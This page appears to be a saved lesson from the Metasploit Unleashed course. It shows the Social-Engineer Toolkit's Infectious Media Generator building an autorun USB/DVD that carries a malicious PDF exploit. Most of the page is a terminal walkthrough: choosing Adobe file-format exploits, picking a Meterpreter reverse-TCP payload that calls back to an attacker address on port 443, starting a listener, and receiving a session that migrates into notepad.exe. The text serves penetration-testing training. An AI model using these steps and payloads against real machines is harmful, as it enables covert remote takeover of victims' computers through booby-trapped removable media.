<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
<html>
<head>
  <meta content="text/html; charset=ISO-8859-1"
 http-equiv="Content-Type">
  <title>Infectious Media Generator</title>
<link rel="stylesheet" type="text/css" href="/home/steve/metasploit_unleashed/css.css" /></head>
<body>
<h1 style="color: rgb(0, 0, 0);" id="firstHeading" class="firstHeading">Infectious
Media Generator</h1>
<h3 style="color: rgb(0, 0, 0);" id="siteSub">From Metasploit Unleashed
- Mastering The Framework</h3>
<p style="color: rgb(0, 0, 0);">Moving on to the physical attack
vectors and a completely different
attack method, we will be utilizing the Infectious USB/DVD/CD attack
vector. This attack vector will allow you to import your own malicious
executable or one of those within Metasploit to create a DVD/CD/USB
that incorporates an autorun.inf file. Once this device is inserted it
will call autorun and execute the executable. New in the most recent
version, you can utilize file-format exploits as well, if you're
worried that an exectuable will trigger alerts, you can specify a file
format exploit that will trigger an overflow and compromise the system
(for example, an Adobe exploit).
<br>
<br>
</p>
<pre id="code">Select from the menu:<br><br>1.  Spear-Phishing Attack Vectors<br>2.  Website Attack Vectors<br>3.  Infectious Media Generator<br>4.  Create a Payload and Listener<br>5.  Mass Mailer Attack<br>6.  Teensy USB HID Attack Vector<br>7.  SMS Spoofing Attack Vector<br>8   Update the Metasploit Framework<br>9.  Update the Social-Engineer Toolkit<br>10. Help, Credits, and About<br>11. Exit the Social-Engineer Toolkit<br><br>Enter your choice: 3<br><br>The Infectious USB/CD/DVD method will create an autorun.inf file and a Metasploit<br>payload. When the DVD/USB/CD is inserted, it will automatically run if autorun<br>is enabled.<br><br>Pick what type of attack vector you want to use, fileformat bugs or a straight executable.<br><br>1. File-Format Exploits<br>2. Standard Metasploit Executable<br><br>Enter your numeric choice (return for default): 1<br>Enter the IP address for the reverse connection (payload): 172.16.32.129<br><br>Select the file format exploit you want.<br>The default is the PDF embedded EXE.<br><br>        ********** PAYLOADS **********<br><br>1. SET Custom Written DLL Hijacking Attack Vector (RAR, ZIP)<br>2. Adobe Flash Player 'Button' Remote Code Execution<br>3. Adobe CoolType SING Table 'uniqueName' Overflow<br>4. Adobe Flash Player 'newfunction' Invalid Pointer Use<br>5. Adobe Collab.collectEmailInfo Buffer Overflow<br>6. Adobe Collab.getIcon Buffer Overflow<br>7. Adobe JBIG2Decode Memory Corruption Exploit<br>8. Adobe PDF Embedded EXE Social Engineering<br>9. Adobe util.printf() Buffer Overflow<br>10. Custom EXE to VBA (sent via RAR) (RAR required)<br>11. Adobe U3D CLODProgressiveMeshDeclaration Array Overrun<br>12. Adobe PDF Embedded EXE Social Engineering (NOJS)<br><br>Enter the number you want (press enter for default): 1<br><br>1. Windows Reverse TCP Shell              Spawn a command shell on victim and send back to attacker.<br>2. Windows Meterpreter Reverse_TCP        Spawn a meterpreter shell on victim and send back to attacker.<br>3. Windows Reverse VNC DLL                Spawn a VNC server on victim and send back to attacker.<br>4. Windows Reverse TCP Shell (x64)        Windows X64 Command Shell, Reverse TCP Inline<br>5. Windows Meterpreter Reverse_TCP (X64)  Connect back to the attacker (Windows x64), Meterpreter<br>6. Windows Shell Bind_TCP (X64)           Execute payload and create an accepting port on remote system.<br>7. Windows Meterpreter Reverse HTTPS      Tunnel communication over HTTP using SSL and use Meterpreter<br><br>Enter the payload you want (press enter for default):<br>[*] Windows Meterpreter Reverse TCP selected.<br>Enter the port to connect back on (press enter for default):<br>[*] Defaulting to port 443...<br>[*] Generating fileformat exploit...<br>[*] Please wait while we load the module tree...<br>[*] Started reverse handler on 172.16.32.129:443<br>[*] Creating 'template.pdf' file...<br>[*] Generated output file /pentest/exploits/set/src/program_junk/template.pdf<br><br>[*] Payload creation complete.<br>[*] All payloads get sent to the src/program_junk/template.pdf directory<br>[*] Payload generation complete. Press enter to continue.<br>[*] Your attack has been created in the SET home directory folder "autorun"<br>[*] Copy the contents of the folder to a CD/DVD/USB to autorun.<br><br><br>Do you want to create a listener right now yes or no: yes<br>[-] ***<br>[-] * WARNING: No database support: String User Disabled Database Support<br>[-] ***<br><br>                                  _       _<br>             _                   | |     (_)_<br> ____   ____| |_  ____  ___ ____ | | ___  _| |_<br>|    \ / _  )  _)/ _  |/___)  _ \| |/ _ \| |  _)<br>| | | ( (/ /| |_( ( | |___ | | | | | |_| | | |__<br>|_|_|_|\____)\___)_||_(___/| ||_/|_|\___/|_|\___)<br>                           |_|<br><br>resource (/pentest/exploits/set/src/program_junk/meta_config)&gt; use multi/handler<br>resource (/pentest/exploits/set/src/program_junk/meta_config)&gt; set payload windows/meterpreter/reverse_tcp<br>payload =&gt; windows/meterpreter/reverse_tcp<br>resource (/pentest/exploits/set/src/program_junk/meta_config)&gt; set lhost 172.16.32.129<br>lhost =&gt; 172.16.32.129<br>resource (/pentest/exploits/set/src/program_junk/meta_config)&gt; set lport 443<br>lport =&gt; 443<br>resource (/pentest/exploits/set/src/program_junk/meta_config)&gt; exploit -j<br>[*] Exploit running as background job.<br>msf exploit(handler) &gt;<br>[*] Started reverse handler on 172.16.32.129:443<br>[*] Starting the payload handler...</pre>
<br style="color: rgb(0, 0, 0);">
<span style="color: rgb(0, 0, 0);">When doing an ls &#8211;al in the SET
directory you should notice that
there is an &#8220;autorun&#8221; folder. Burn the contents of that directory to a
DVD or write to a USB device. Once inserted you would be presented with
a shell.
</span><br style="color: rgb(0, 0, 0);">
<br style="color: rgb(0, 0, 0);">
<pre id="code">[*] Sending stage (748544 bytes) to 172.16.32.131<br>[*] Meterpreter session 1 opened (172.16.32.129:443 -&gt; 172.16.32.131:1333) at Thu Sep 09 12:42:32 -0400 2010<br>[*] Session ID 1 (172.16.32.129:443 -&gt; 172.16.32.131:1333) processing InitialAutoRunScript 'migrate -f'<br>[*] Current server process: java.exe (824)<br>[*] Spawning a notepad.exe host process...<br>[*] Migrating into process ID 3044<br>[*] New server process: notepad.exe (3044)<br>msf exploit(ms09_002_memory_corruption) &gt;</pre>
<br style="color: rgb(0, 0, 0);">
<br style="color: rgb(0, 0, 0);">
<div style="text-align: center; color: rgb(0, 0, 0);"><a
 href="http://www.offensive-security.com/metasploit-unleashed/SET"
 title="SET">SET</a></div>
</body>
</html>
